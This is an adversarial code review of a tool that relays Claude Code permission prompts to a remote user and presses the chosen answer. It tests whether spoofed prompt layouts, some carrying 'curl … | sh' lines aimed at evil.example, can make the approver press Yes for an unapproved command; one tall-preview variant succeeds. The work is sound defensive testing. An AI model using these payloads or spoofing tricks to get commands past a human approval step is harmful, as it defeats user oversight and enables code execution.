# Adversarial scoped re-review: spec 11 N1 (+ N2) fix

Range `22f7de6..375c175` on `feat/remote-access`. Reviewer: redteam. Date 2026-11-09.
Everything below was run on a scratch tmux server (`tools/tests/lib.zsh`, `-f /dev/null`, 200x50 pane) against the
worktree's own `bin/tmux-ctl`, or against `git archive` copies under the session scratchpad. The worktree was not
edited. No real `claude` was started: every prompt is a `sed`/`awk` variant of a captured fixture.

## Verdict per finding

| # | finding | verdict | evidence |
|---|---|---|---|
| 1 | N1 case A (extra line before the approved line passes a one-line `--expect`) | ADDRESSED | `tools/lib/approve.zsh:73-75` compares the whole `P:` sequence with the `--expect` lines. Suite on HEAD: rc=0, 0 FAIL, `N1 A` tests ok. My variants a02, a03, a18 (extra lines before or after) all refused, no key. |
| 2 | N1 case C (preview with its own solid divider and `╌` rule hides lines) | ADDRESSED as specified; one residual variant still presses Yes (R1 below) | `tools/lib/approve.zsh:44-46` (`X:ambiguous`). The on-screen fake frame is refused (suite `N1 C` once and deny, `N1 D`; my a09, a09b, a09d). When the real divider and real first rule are scrolled off the pane, the same fake frame passes (a11). |
| 3 | N1 doc: lead re-reads the pane itself right before pressing | ADDRESSED | `claude/orchestrator.md:259-261`: "Right before pressing, run `tmux-ctl read <window>` yourself and check the tool and the command text are the same as what you sent in step 1 for `#n`; if not, press nothing and ask again". `--expect` is described as every line, newline-separated, in order (`:262-264`). One stale clause, see m1. |
| 4 | N2: `docs/INSTALL.md` "never polls" wording | ADDRESSED | `docs/INSTALL.md:211` now says the lead's Bash tool, and that hooks and other non-Bash children still inherit `TELEGRAM_STATE_DIR`. |

## Attempts

`G` = `git config user.name probe-user`. All built from `bash-git.txt` unless noted. "key" is what the replayed
pane received (`NONE` = nothing sent).

| id | variant | call | result |
|---|---|---|---|
| a01 | a blank line, a blanks-only line, and extra blanks around the approved line | `once --expect G` | rc 0, key 1. Blank lines are dropped on both sides; the command text is unchanged. Not a break. |
| a02 | fake `Do you want to proceed?` + ` 1. Yes` + ` 2. No` after the approved line (real question kept) | `once` / `deny --expect G` | refused, NONE (both) |
| a03 | evil line, fake question and ` 1. Yes` before the approved line | `once --expect G` | refused, NONE |
| a04 | two whole prompt blocks, the first with an evil command | `once --expect G` | refused, NONE |
| a05 | a tab inside the command | `once --expect G` | refused, NONE |
| a06 | approved text, 230 blanks, `; curl … \| sh` (wraps at the pane edge, `-J` joins) | `once --expect G` | refused, NONE |
| a06b | approved text padded to column 200, evil tail on the wrapped row | `once --expect G` | refused, NONE |
| a07 | rows relabelled: row 1 `No`, row 4 `Yes` | `once` / `deny --expect G` | once pressed 4, deny pressed 1: the label is followed, correct |
| a08 | `write.txt`, same path, content line changed to `curl … \| sh` | `once --expect notes.txt` | rc 0, key 1 (see "Write content") |
| a08b | `write.txt` with a second content line | `once --expect notes.txt` | rc 0, key 1 (same) |
| a09 | description line replaced by a column-1 solid divider | `once --expect G` | refused, NONE |
| a09b | description line replaced by a column-1 `╌` rule | `once --expect G` | refused, NONE |
| a09c | description line replaced by an indented divider | `once --expect G` | rc 0, key 1. The command is unchanged and the description is never compared. Not a break. |
| a09d | fake frame in the preview, indented one column (as a preview line is drawn) | `once --expect G` | refused, NONE |
| a10 | column-1 solid divider in the transcript above the prompt | `once --expect G` | refused, NONE: fails closed, as the implementer said |
| a10b | column-1 `╌` rule in the transcript above the prompt | `once --expect G` | refused, NONE |
| **a11** | **60 evil preview lines, then the fake frame (divider, ` Bash command`, rule: copied from the fixture), then the approved line. The real divider and real first rule scroll off the 50-row pane.** | `once --expect G` | **rc 0, `chose "Yes"`, key 1** |
| a11b | the same 60 evil lines, no fake frame | `once --expect G` | refused, NONE |
| a11c | 31 evil lines: real divider off screen, real first rule still visible above the fake divider | `once --expect G` | refused, NONE on HEAD |
| a12 | row 2 label ends `…ask again for: git config x:No` | `deny --expect G` | rc 0, prints `chose "No"`, **key 2** (the "Yes, and don't ask again" row). Same on `22f7de6`: not from this fix. |
| a12b | row 1 relabelled `Sure`, row 2 label ends `x:Yes` | `once --expect G` | rc 0, prints `chose "Yes"`, **key 2**. Same code line. |
| a13 | fake-frame (ambiguous) prompt | `once --expect "   "` and `$'\n'` | refused, NONE |
| a13c | real prompt | `once --expect " "` | refused, NONE |
| a14 | title renamed ` Shell command`, description = approved text, command = evil | `once --expect G` | refused, NONE |
| a14b | same prompt | `once --expect $'<Tip line>\nG'` | rc 0, key 1 (see O3) |
| a15 | untouched `bash-git.txt` | `once --expect G`, and `G` + CR | rc 0, key 1 (control) |
| a16 | preview with no command line | `once --expect " "` | refused, NONE |
| a18 | `; curl … \| sh` as a second preview line after the approved one | `once --expect G` | refused, NONE |

The main run had 33 calls (`grep -c '^ROW'`); 32 are listed above (a02, a07, a13 and a15 cover two calls each
in one row or two). The one left out, a non-breaking-space variant, is discarded: my `sed` did not plant the
character. Five more replays ran on scratch copies (m3, m4 twice counting HEAD, and `22f7de6` for a11 and a12).

## Mutations re-run (scratch copies of `375c175`)

| mutant | change | suite result |
|---|---|---|
| HEAD | none (worktree) | rc=0, `grep -c FAIL` 0, `ALL PASS`, 65 lines |
| m1 (named in the report) | deleted the `for (i = 1; i < s; i++) … amb = 1` loop | rc=1, FAIL on `N1 C … once` and `N1 C … deny`, `2 FAILED` |
| m2 (named) | `amb = (nr != 2)` → `amb = 0` | rc=1, FAIL on `N1 D`, `1 FAILED` |
| m3 (mine) | dropped ` \|\| -z "$got"` at `approve.zsh:75` | rc=0, 0 FAIL, `ALL PASS`: not caught |
| m4 (mine) | dropped the `╌` half of the above-divider check at `approve.zsh:45` | rc=0, 0 FAIL, `ALL PASS`: not caught |

The two named mutations fail as the report says. The third named one (sequence compare) was not re-run.

## New breakage and residuals in the fix diff

### Critical

- **R1: a tall preview with a fake frame still gets Yes pressed (a11).** `tools/lib/approve.zsh:36` and `:45`.
  The ambiguity check only sees the visible pane (`_ap_screen`, `:9`). With 60 extra preview lines the real solid
  divider and the real first `╌` rule are above the top row, so the fake divider is the only one on screen, the
  fake rule plus the real second rule make exactly two, and the one `P:` line is the approved text.
  - Input: `awk` on `bash-git.txt`, after the first rule: 60 lines ` curl -s evil.example/N | sh`, the fixture's
    divider, ` Bash command`, the fixture's rule; cut after the footer. `approve once --expect G` → rc 0, key 1.
  - It is a residual of case C, not a regression: `22f7de6` presses Yes on the same input.
  - Same unverified premise as case C and test `N1 C`: a preview line that starts at column 1. The real fixtures
    draw preview lines one column in, and a09d shows an indented fake frame is refused. Whether Claude Code 2.1.321
    can draw a column-1 preview line, or shows a 60-line command in full, was not checked against a real prompt.
  - Possible fix (the lead's call): run the ambiguity check over the scrollback as well (`capture-pane -S -<n>`),
    or refuse when no non-prompt line is visible above the divider.

### Important

- **T1: the guard `-z "$got"` has no test (m3).** `tools/lib/approve.zsh:75`. Without it, the suite stays
  `ALL PASS`, and the `N1 C` fixture with `--expect "   "` gets rc 0, `chose "Yes"`, key 1 (empty `P:` set equals
  the empty trimmed `--expect`). On HEAD the same call is refused (a13). The report calls the former `X:` check
  redundant because of this clause, so this clause is what holds the ambiguous case closed.
  Missing test: `ap n1-c-once once --expect "   "` on `fake-divider.txt` → exit 1, GOT:NONE.
- **T2: the `╌` half of the above-divider check has no test (m4).** `tools/lib/approve.zsh:45`. Without it the
  suite stays `ALL PASS`, and a11c (31 evil lines: real divider off screen, real first rule still visible) gets
  rc 0, key 1. On HEAD a11c is refused. In test `N1 C` the real divider also sits above the fake one, so either
  half alone passes it.

### Minor

- **m1: stale clause in step 3.** `claude/orchestrator.md:267`: "(also when `<line>` is not a line of the command)"
  still names `<line>` and the old one-line rule; the placeholder is now `<lines>`.
- **m2: stale code comment.** `tools/lib/approve.zsh:38-39` still says a non-Bash prompt's `P:` lines are "also"
  its header lines; they are now only the header lines.

## Write content (asked in the brief)

A Write prompt with the same path and different content passes `--expect notes.txt` (a08, a08b). Spec §5 step 1
sends "the exact command or file path as shown", and the fix brief decides "for Write/Edit, the file path line",
so the user approves a path, not content. That matches the spec. The swap guard still covers content between
capture and send (the `B:` lines are compared at `:86-87`). The step-3 re-read compares "the tool and the command
text"; for Write that is the path, so a changed content under the same path is not caught by tool or protocol.
Acceptable for the spec as written; worth one sentence to the user.

## Evidence checks on the diff's tests

1. Fixture origin: all new variants are `sed`/`awk` edits of captured fixtures. The column-1 fake divider and rule
   in `N1 C` and `N1 D` (and in my a11) are copied bytes placed where no real capture shows them.
2. Artefact under test: the suite runs the real `bin/tmux-ctl` and `tools/lib/approve.zsh`; nothing is re-implemented.
3. User-experienced check: `GOT:` reads the key the pane received. Good.
4. State: scratch server, one 200x50 pane, never a real `claude`, never a prompt taller than the pane (R1).
   There is still no Edit fixture; "Edit shows its path like Write" is unchecked.
5. Universal claims: suite verdicts above are rc read alone plus an uncapped `grep -a -c FAIL`.
6-8: no CI-only inputs, runbook preconditions or endpoints in this diff.

## Out-of-scope observations

- **O1 (pre-existing, serious): `deny` can press a "Yes, and don't ask again" row (a12).** `approve.zsh:78`,
  `[[ "$line" == O:*:"$want" ]]`: `*` also matches a label that contains a colon and ends in `:No` or `:Yes`.
  Row 2 `Yes, and don’t ask again for: git config x:No` → `deny` prints `chose "No"` and sends 2. Present at
  `22f7de6`. The row-2 pattern comes from the command; whether Claude Code can end it in `:No` was not checked.
  Fix: match the digits, e.g. `O:<->:"$want"`.
- O2: the printed label is `$want`, not the label of the pressed row, so a12 reports `chose "No"`.
- O3: the non-Bash branch applies to any prompt with two rules whose title is not `Bash command`: only the header
  lines are compared and the text between the rules is not (a14b). Fine for Write; unknown for other tools.
- O4: blank lines and leading or trailing blanks of preview lines are not compared (a01).
- O5: every call with a column-1 divider or rule in the visible transcript is refused (a10, a10b). It fails closed;
  the lead will then have to send the user to the terminal.

## Verdict

Findings 1, 3 and 4 are addressed and case C is closed for a prompt that fits on the pane, but not ready to merge
as "Yes only for the approved command": 1 Critical residual (R1, tall preview) and 2 Important test gaps (T1, T2),
plus a pre-existing `deny` mis-press (O1) for the lead to decide on.

## Round 2

Range `375c175..5c9f6aa` (three commits), reviewed 2026-11-09. Code and tests were run from a `git archive 5c9f6aa`
copy under the scratchpad; the worktree was not edited. `5c9f6aa..HEAD` (`819868d`) only rewords one line of
`claude/orchestrator.md`.

### Verdict per finding

| finding | verdict | evidence |
|---|---|---|
| R1 (tall preview + column-1 fake frame) | ADDRESSED by the lead's ruling, not by code: the input is unreachable from a real prompt in every shape I probed | My a11 input still gets rc 0, `chose "Yes"`, key 1 at `5c9f6aa`. My own real probe (below) agrees with the implementer's: no preview or content line starts at column 1. |
| T1 (`-z "$got"` untested) | ADDRESSED | Test `T1: blank --expect on the fake-frame prompt`. Mutant without the clause: rc=1, that test FAILs. HEAD: a13 input refused, no key. |
| T2 (`╌` half untested) | ADDRESSED | Test `T2: only a ╌ rule above the fake divider`. Mutant without the half: rc=1, that test FAILs. HEAD: a11c input refused, no key. |
| O1 (`deny` pressed row 2) | ADDRESSED | `tools/lib/approve.zsh:81` is `O:<->:"$want"`. My a12 input: `deny` now sends key 4. Mutant with `O:*:`: rc=1, the three O1 tests FAIL. |

### Does the probe support the R1 ruling?

Yes, for Bash, Write and Edit prompts of a plain `claude` session. I ran one real session myself (claude
**2.1.322**, the version now installed; the fixtures are 2.1.321), scratch server `-L rtprobe -f /dev/null`, 200x50,
scratch git dir, `--permission-mode default`, every prompt answered with Esc. Captures are in the scratchpad
(`probe/p1-J.txt` … `p4-J.txt`).

| probe | asked | drawn | round-2 parser on the capture |
|---|---|---|---|
| p1 long line | one-line `git config user.name start` + 300 `─` + `end` | two rows, both ` │ …`; the wrapped row is ` │ ────…`, never column 1. `-J` and plain capture are identical (Claude Code wraps itself). | 2 `P:` lines, each with the gutter |
| p2 tall | one Bash call of 60 lines | all 60 lines drawn ` │ git config user.name lineN`; the divider, the first rule and lines 1-20 are off the top of the pane | `X:ambiguous` (refuses) |
| p3 Write | `notes.txt` with a 300-`─` line, a 300-`╌` line, `hello` | `  1 ────…`, wrapped row `    ────…`, `  2 ╌╌╌…`: all indented | `P:notes.txt` |
| p4 Edit | replace a line of `edit.txt` with the same two lines | ` 1 -alpha`, ` 1 +────…`, wrapped row `   +────…`: all indented; title ` Edit file`, path ` edit.txt` | `P:edit.txt` |

So a wrapped long line, a tall command, Write content and Edit content all stay indented, and a11 needs a
column-1 line. A fake frame drawn with the indent is refused (a09d, round 1).

Not probed, so the ruling does not rest on evidence there: prompts of other tools (MCP, WebFetch, NotebookEdit),
and a teammate's or subagent's prompt (the fixture README says all captures are from a plain session, while the
protocol is for teammates and workers). A prompt with no two `╌` rules is refused, so those fail closed unless
they draw two rules.

Side effects of my probe: a trust entry for the deleted scratch dir in `~/.claude.json` (as in the README), and
one first request ran `echo` without a prompt (auto-allowed, printed text only). No file was created; the server
was killed and the dir removed (`ps` count 0).

### Mutations re-run (copies of `5c9f6aa`)

| mutant | suite result |
|---|---|
| unmutated | rc=0, `grep -a -c FAIL` 0, `ALL PASS`, 73 lines |
| `O:<->:` → `O:*:` | rc=1, 3 FAILED (the three `O1` tests) |
| ` \|\| -z "$got"` dropped | rc=1, 1 FAILED (`T1`) |
| `╌` half of the above-divider check dropped | rc=1, 1 FAILED (`T2`) |
| column-1 loop between the rules deleted | rc=1, 1 FAILED (`column-1 preview line`) |

All four named mutations fail as the report says.

### New breakage in the round-2 diff

Critical: none. Important: none.

Minor:
- **m3: the R1 decision lives only in the report.** `approve.zsh` and the test file do not say that a column-1
  fake frame above the chosen divider with the real frame scrolled off (a11) is still accepted and why. One
  comment naming the probe would stop a later reader from assuming `X:ambiguous` covers it.
- **m4: version drift.** The README row and the code comment cite 2.1.321; the installed CLI is 2.1.322. The
  layout is the same in my probe.

### Evidence checks (round-2 tests)

1. Fixture origin: `bash-multiline.txt` is a real capture (README row says how). The `col1.txt`, `rule-only.txt`
   and O1 variants are `sed`/`awk` edits of real fixtures.
2. Artefact under test: the real `bin/tmux-ctl`.
4. State: still one 200x50 scratch pane; the suite has no prompt taller than the pane. My p2 capture shows the
   parser refuses the real one.
5. Counts above are rc read alone plus uncapped `grep -a -c FAIL`.

### Out-of-scope observations (round 2)

- O6: a wrapped single line and a two-line command are drawn the same way (p1: both rows carry ` │ `). `--expect`
  and the Telegram message carry rows, so the user cannot tell `a<wrap>b` from `a` newline `b`. This is Claude
  Code's drawing, not this diff.
- O7: any Bash, Write or Edit prompt taller than the pane is refused (p2), so those go to the terminal. Fails closed.
- O8: row 2's "don't ask again for:" pattern comes from the command (`──── echo *` in `bash-multiline.txt`).
  With O1 fixed it can no longer be taken for the `No` or `Yes` row.

### Round 2 verdict

R1 parked on evidence I could reproduce, T1, T2 and O1 fixed and their mutations caught, no new Critical or
Important: ready to merge, with the unprobed prompt kinds (other tools, teammate panes) left as a known limit.

### Round 2 addendum: range extended to `819868d`

`git diff 5c9f6aa 819868d` is one changed line in `claude/orchestrator.md:263`: step 3 now gives the example
`$'│ echo a\n│ ──── echo probe'` and says the gutter is included. No code or test changed, so the suite and
mutation results above stand for `819868d`.

- The example is correct: it is byte for byte the `--expect` that test `r2-ml` passes against the real capture
  `tools/tests/fixtures/approve/bash-multiline.txt` (`tools/tests/test_ctl_approve.zsh:202`), which chose Yes
  (key 1) in the unmutated run.
- Minor (m5): the sentence says "a multi-line command shows each line after a `│ ` gutter". My probe p1 shows a
  single-line command that wraps is drawn the same way (two rows, both with the gutter), so "multi-line" should
  read "a command drawn on more than one row". A lead who drops the gutter gets `the prompt … changed` and no
  key, so the wording cannot cause a wrong press.

Verdicts unchanged for `375c175..819868d`: R1, T1, T2, O1 ADDRESSED; 0 new Critical, 0 new Important.
